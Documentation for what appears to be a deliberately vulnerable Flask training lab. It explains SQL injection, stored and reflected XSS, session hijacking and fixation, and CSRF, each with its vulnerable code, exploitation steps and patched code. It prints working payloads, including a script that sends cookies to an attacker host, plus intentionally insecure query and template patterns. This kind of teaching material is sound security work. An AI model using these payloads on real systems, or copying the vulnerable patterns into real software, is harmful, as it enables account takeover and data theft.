# VulnLab Developer Documentation

## Page 1: Login — SQL Injection (Authentication Bypass)

### Page Structure
- **Route Path:** `/login`
- **Template File:** `templates/login.html`
- **Form Fields:** `username` (text), `password` (password)
- **Backend File/Function Involved:** `modules/sqli.py` -> `login()` route function

### Vulnerability Type & OWASP Category
SQL Injection — **A03:2021-Injection**

### Root Cause
The vulnerability occurs because the backend builds the SQL query by directly concatenating raw, unsanitized user input into an f-string instead of using safe, parameterized queries. 

Vulnerable line of code (`modules/sqli.py`):
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

### Exploitation Steps
1. Navigate to the login page at `/login`.
2. Ensure the vulnerability mode is active (Footer should read "Mode: VULNERABLE").
3. In the `username` field, enter the following payload: `' OR '1'='1' -- `
4. Enter any arbitrary value in the `password` field (e.g., `test`).
5. Click **Login**.

**What happens in the SQL query:**
When the payload is substituted into the f-string, the resulting query executed by the database becomes:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' -- ' AND password='test'
```
The `-- ` comment sequence tells the SQLite database to ignore the rest of the query (the password check). The condition `'1'='1'` evaluates to true for every row in the `users` table. As a result, the database returns all user records. Since the backend application uses `.fetchone()`, it grabs the first returned record (typically the `admin` user or user ID 1) and authenticates the attacker as that user without requiring a valid password.

### Impact
- **Severity:** Critical
- **Gain:** Complete authentication bypass. An attacker gains unauthorized access to the application, authenticating as the first user returned by the database (usually an administrator). This completely compromises the application's access controls.

### Fix Applied
The patched version utilizes SQLAlchemy's ORM, which inherently handles parameterized queries and separates the data from the SQL command structure.

Patched code (`modules/sqli.py`):
```python
user = User.query.filter_by(username=username).first()
if user and check_password_hash(user.password_hash, password):
    # Log in user
```
By using `filter_by(username=username)`, the underlying database driver treats the user input strictly as a literal value rather than executable SQL syntax. Any injected SQL metacharacters (like `'` or `--`) are safely escaped, preventing the database from altering the logical structure of the query.

### How to Toggle
- **Config Flag:** `config.VULN_MODE["sqli"]`
- Set to `True` to enable the vulnerable string-concatenation query.
- Set to `False` to enable the patched SQLAlchemy ORM parameterized query.

---

## Page 2: Product Search — SQL Injection (UNION-based Data Extraction)

### Page Structure
- **Route Path:** `/search`
- **Template File:** `templates/search.html`
- **Form Fields:** `query` (text search input)
- **Backend File/Function Involved:** `modules/search.py` -> `search()` route function

### Vulnerability Type & OWASP Category
SQL Injection (UNION-based) — **A03:2021-Injection**

### Root Cause
The vulnerability stems from the use of unsafe string concatenation to build the SQL query. The `LIKE` operator takes raw user input dynamically instead of using a parameterized query, allowing an attacker to break out of the intended query structure.

Vulnerable line of code (`modules/search.py`):
```python
sql = f"SELECT name, price, description FROM products WHERE name LIKE '%{query}%'"
```

### Exploitation Steps
1. Navigate to the product search page at `/search`.
2. Ensure the vulnerability mode is active (Footer should read "Mode: VULNERABLE").
3. In the search input field, enter the following payload: 
   `' UNION SELECT username, password_hash, 'x' FROM users -- `
4. Click **Search**.

**Why this payload works:**
In a UNION-based SQL Injection, the injected `UNION SELECT` statement must return the exact same number of columns as the original `SELECT` statement. The original query selects 3 columns (`name`, `price`, `description`). 
Our payload provides exactly 3 columns:
1. `username` (from users table)
2. `password_hash` (from users table)
3. `'x'` (a dummy string literal to satisfy the 3-column requirement)

When injected into the string concatenation, the resulting SQL query becomes:
```sql
SELECT name, price, description FROM products WHERE name LIKE '%' UNION SELECT username, password_hash, 'x' FROM users -- %'
```
The `-- ` comment sequence neutralizes the trailing `%'` left over from the code. The database executes both the product search and our injected query, combining the results. Because the frontend blindly renders the returned columns in a table, the usernames and password hashes are displayed directly on the webpage.

### Impact
- **Severity:** High
- **Gain:** Data exfiltration. An attacker can systematically dump sensitive data (like password hashes, PII, or API keys) from entirely unrelated tables, bypassing application logic.

### Fix Applied
The patched version utilizes SQLAlchemy's Object-Relational Mapper (ORM), which automatically creates parameterized queries under the hood.

Patched code (`modules/search.py`):
```python
products = Product.query.filter(Product.name.contains(query)).all()
```
When using `.contains()`, the search string is bound as a parameter instead of being interpolated into the raw SQL string. The database driver treats the injected payload strictly as literal search text, making it impossible to break out of the string boundary or execute secondary SQL commands.

### How to Toggle
- **Config Flag:** `config.VULN_MODE["sqli"]` (Shares the general SQLi toggle)
- Set to `True` to enable the vulnerable string-concatenation search query.
- Set to `False` to enable the patched SQLAlchemy ORM parameterized query.

---

## Page 3: Comments — Stored Cross-Site Scripting (XSS)

### Page Structure
- **Route Path:** `/comments`
- **Template File:** `templates/comments.html`
- **Form Fields:** `name` (text), `comment` (textarea)
- **Backend File/Function Involved:** `modules/xss.py` -> `comments()` route function

### Vulnerability Type & OWASP Category
Stored Cross-Site Scripting (XSS) — **A03:2021-Injection**

### Root Cause
The vulnerability stems from the frontend template rendering user-supplied data without proper output encoding. In vulnerable mode, the Jinja2 template explicitly disables its built-in auto-escaping by using the `| safe` filter. This allows any raw HTML or JavaScript stored in the database to be rendered directly into the DOM as executable code. Note that the backend (`xss.py`) correctly does not sanitize the input upon saving; XSS is primarily an output-encoding problem.

Vulnerable line of code (`templates/comments.html`):
```html
{{ c.text | safe }}
```

### Exploitation Steps
1. Navigate to the guestbook page at `/comments`.
2. Ensure the vulnerability mode is active (Footer should read "Mode: VULNERABLE").
3. In the Name or Comment field, enter the following payload:
   `<script>fetch('http://ATTACKER_HOST:9001/steal?c='+document.cookie)</script>`
4. Click **Post Comment**.

**How the payload works:**
Unlike *Reflected* XSS (where the payload is bounced back immediately via a URL parameter), this payload is saved directly into the `comments` database table. This makes it a **Stored (Persistent) XSS** attack. Every time *any* visitor navigates to the `/comments` page, the backend retrieves this payload from the database and embeds it into the HTML document. When the victim's browser parses the page, it hits the `<script>` tag and executes it in the context of their session. 
*(Note: This exact payload is reused later in **Page 7: Session Hijacking** to steal the victim's session cookie.)*

### Impact
- **Severity:** High
- **Gain:** Client-side code execution. An attacker can force victims' browsers to perform actions on their behalf, rewrite the DOM (defacement), or silently exfiltrate sensitive data like session cookies, which leads directly to complete account takeover.

### Fix Applied
The patched version removes the `| safe` filter from the Jinja2 template. By default, Jinja2 employs context-aware auto-escaping.

Patched code (`templates/comments.html`):
```html
{{ c.text }}
```
When auto-escaping is active, Jinja2 translates dangerous characters into their safe HTML-entity equivalents before they reach the browser (e.g., `<` becomes `&lt;` and `>` becomes `&gt;`). As a result, the browser interprets the payload purely as literal text rather than executable markup.

### How to Toggle
- **Config Flag:** `config.VULN_MODE["xss"]`
- Set to `True` to use the `| safe` filter (disabling auto-escaping).
- Set to `False` to rely on Jinja2's default auto-escaping (safely rendering HTML).

---

## Page 4: Reflected Search — Reflected XSS

### Page Structure
- **Route Path:** `/search_reflected`
- **Template File:** `templates/search_reflected.html`
- **Form Fields:** `query` (text search input, passed as a GET parameter)
- **Backend File/Function Involved:** `modules/xss.py` -> `search_reflected()` route function

### Vulnerability Type & OWASP Category
Reflected Cross-Site Scripting (XSS) — **A03:2021-Injection**

### Root Cause
Similar to the Stored XSS module, the root cause is a failure to properly encode user output before rendering it into the DOM. In this specific scenario, the application takes a URL query parameter (`query=...`) and immediately echoes it back onto the webpage ("Showing results for: ..."). In vulnerable mode, the Jinja2 template applies the `| safe` filter to the input, bypassing the built-in HTML entity encoder and allowing raw markup to be interpreted by the browser.

Vulnerable line of code (`templates/search_reflected.html`):
```html
{{ search_query | safe }}
```

### Exploitation Steps
1. Ensure the vulnerability mode is active (Footer should read "Mode: VULNERABLE").
2. Instead of navigating to the page normally, construct a malicious URL in your browser's address bar:
   `http://127.0.0.1:5000/search_reflected?query=<script>alert(document.cookie)</script>`
3. Hit Enter to visit the URL.

**The Difference from Stored XSS:**
Unlike the Guestbook module, this payload is **never saved to the database**. It is immediately "reflected" off the web server back into the HTTP response. Because it isn't stored, the payload *only* executes for the person who actually visits that specific crafted link. To exploit this in the real world, an attacker must use **social engineering or phishing** to trick a victim into clicking the malicious URL.

### Impact
- **Severity:** High
- **Gain:** Client-side code execution. While slightly harder to deliver en masse compared to Stored XSS (which hits every visitor automatically), a successful phishing campaign utilizing a Reflected XSS link still yields the exact same impact: stolen session cookies, hijacked accounts, and forced client-side actions.

### Fix Applied
The patched version removes the `| safe` filter from the Jinja2 template, reverting to the framework's secure defaults.

Patched code (`templates/search_reflected.html`):
```html
{{ search_query }}
```
Jinja2's context-aware auto-escaping securely translates the injected HTML tags into benign text entities (e.g., `<` becomes `&lt;`), rendering the reflection completely harmless.

### How to Toggle
- **Config Flag:** `config.VULN_MODE["xss"]` (Shares the general XSS toggle)
- Set to `True` to use the `| safe` filter (disabling auto-escaping).
- Set to `False` to rely on Jinja2's default auto-escaping (safely rendering HTML).

---

## Page 7: Dashboard — Session Hijacking & Session Fixation

### Page Structure
- **Route Path:** `/dashboard` and `/set_session`
- **Template File:** `templates/dashboard.html`
- **Form Fields:** N/A (Targets authentication state management directly)
- **Backend File/Function Involved:** `app.py`, `modules/sqli.py` (login logic), and `modules/session_hijack.py`

### Vulnerability Type & OWASP Category
Session Hijacking & Session Fixation — **A07:2021-Identification and Authentication Failures**

### Root Cause
This module demonstrates two distinct root causes that lead to authentication failure:

1. **Insecure Session Cookie Flags (Hijacking):** The application issues the `session` cookie without the `HttpOnly`, `Secure`, and `SameSite` flags. Most critically, missing `HttpOnly` means client-side JavaScript can freely read the cookie via `document.cookie`. This makes the session highly vulnerable to theft if an XSS vulnerability exists anywhere on the domain.
2. **Failure to Regenerate Session ID (Fixation):** Upon successful authentication, the backend codebase binds the user's logged-in state to whatever session ID already existed in the browser before they logged in. It fails to clear and regenerate a brand new session identifier, allowing an attacker to "fix" the session ID to a known value prior to the victim authenticating.

### Exploitation Steps

#### Demo A: Cookie Theft (via XSS)
1. In a separate terminal, start the attacker listener: `python attacks/listener.py`.
2. As the attacker, navigate to the Guestbook (`/comments`) and submit this payload:
   `<script>fetch('http://127.0.0.1:9001/steal?c='+document.cookie)</script>`
3. As the victim, log in normally, then visit the Guestbook. The malicious script silently runs and beams the victim's session cookie to the attacker's terminal.
4. As the attacker, open `attacks/session_hijack_theft.py`, paste the stolen cookie value into the script, and run it. The script successfully requests `/dashboard` and retrieves the victim's private data without a password.

#### Demo B: Session Fixation
1. As the attacker, run `python attacks/session_fixation.py` in your terminal.
2. The script simulates an attacker setting up a trap by generating a known session ID and sending the victim a malicious link: `/set_session?sessionid=HACKER_CONTROLLED_SESSION_123`.
3. The script simulates the victim clicking the link (which forces their browser to adopt the attacker's session ID) and then logging in normally.
4. Because the server fails to regenerate the ID upon login, the victim's account is now permanently bound to the attacker's known ID.
5. The attacker script automatically replays its pre-existing session cookie and successfully accesses the `/dashboard` directly as the victim.

### Impact
- **Severity:** Critical
- **Gain:** Complete Account Takeover. Whether the attacker steals an active session (Hijacking) or forces a known session before login (Fixation), the end result is identical: the attacker bypasses the entire authentication mechanism and gains full, unauthorized access to the victim's account and data.

### Fix Applied
The patched version resolves both vulnerabilities simultaneously by implementing defense-in-depth:

1. **`HttpOnly=True`:** Prevents client-side scripts from reading the cookie, completely neutralizing XSS-based cookie theft.
2. **`Secure=True`:** Ensures the cookie is only transmitted over encrypted HTTPS connections, preventing network interception (packet sniffing).
3. **`SameSite=Lax` (or `Strict`):** Prevents the browser from sending the cookie along with cross-site requests, mitigating Cross-Site Request Forgery (CSRF).
4. **Session Regeneration:** The login route now explicitly calls `session.clear()` and assigns a cryptographically secure, brand new session ID immediately upon successful authentication. Any pre-existing (potentially fixated) session ID is destroyed.

### How to Toggle
- **Config Flag:** `config.VULN_MODE["session"]`
- Set to `True` to disable secure cookie flags and reuse session IDs on login.
- Set to `False` to enforce `HttpOnly`/`SameSite` flags and regenerate session IDs securely.

---

## Page 5: Profile / Change Email — Cross-Site Request Forgery (CSRF)

### Page Structure
- **Route Path:** `/profile` (GET) and `/change-email` (POST)
- **Template File:** `templates/profile.html`
- **Form Fields:** `new_email`
- **Backend File/Function Involved:** `modules/csrf_module.py` -> `change_email()` route function

### Vulnerability Type & OWASP Category
Cross-Site Request Forgery (CSRF) — **A01:2021-Broken Access Control**

### Root Cause
The vulnerability exists because the server accepts state-changing POST requests exclusively based on the presence of a valid session cookie. By default, web browsers automatically attach cookies to cross-origin requests. Since the server does not enforce a secondary, unpredictable mechanism (like a CSRF token) to verify that the request intentionally originated from the legitimate frontend application, it blindly trusts and processes forged requests initiated by malicious third-party sites.

### Exploitation Steps
1. As a victim, log into VulnLab normally and navigate to `http://127.0.0.1:5000/profile`. Notice your current email address.
2. In the same browser window (e.g. a new tab), open the `attacks/csrf_attack.html` file. This simulates a scenario where the victim clicks a malicious link and visits a completely different website controlled by an attacker.
3. The malicious site instantly and silently executes an invisible, auto-submitting POST form directed at `http://localhost:5000/change-email`.
4. Because the browser automatically attaches the victim's VulnLab session cookie to this forged request, the backend server mistakenly authenticates the action as the victim.
5. Go back to your VulnLab profile tab and refresh the page. Your email address has been successfully changed to `attacker@evil.com` without your explicit consent or knowledge!

### Impact
- **Severity:** High
- **Gain:** Unauthorized state modification. An attacker can force a victim's browser to execute unintended actions on the application, such as changing their email (which could subsequently lead to an account takeover via a password reset flow), transferring funds, or altering critical account settings.

### Fix Applied
The patched version resolves the vulnerability using a defense-in-depth strategy combining two distinct layers:

1. **Synchronizer Token Pattern (CSRF Tokens):** The `Flask-WTF` extension is utilized to generate a cryptographically secure, unpredictable, and unique token (`csrf_token`) when rendering the `profile.html` form. When a POST request is submitted, the server validates that this token is present and correct. Since a third-party attacker site cannot read the token from the victim's application (due to the browser's Same-Origin Policy), they cannot include it in their forged request, and the server rejects it.
2. **`SameSite=Strict` Cookie Flag:** The session cookie is explicitly configured with `SameSite='Strict'`. This instructs the modern web browser to *never* attach the session cookie to cross-origin POST requests. If the attacker's site attempts to POST to the endpoint, the request arrives at the server completely unauthenticated.

**Why relying on just one is weaker:** 
While `SameSite` cookies provide excellent ambient protection against CSRF, older browsers or specific cross-site navigation scenarios might still transmit the cookie. Conversely, relying solely on CSRF tokens leaves the application vulnerable if an XSS vulnerability exists on the domain (which could allow an attacker to read the token). Utilizing both forms a highly robust defense-in-depth posture.

### How to Toggle
- **Config Flag:** `config.VULN_MODE["csrf"]`
- Set to `True` to disable `Flask-WTF` CSRF validation and leave the session cookie susceptible to cross-site transmission.
- Set to `False` to mandate CSRF tokens on all POST requests and enforce the `SameSite='Strict'` cookie policy.
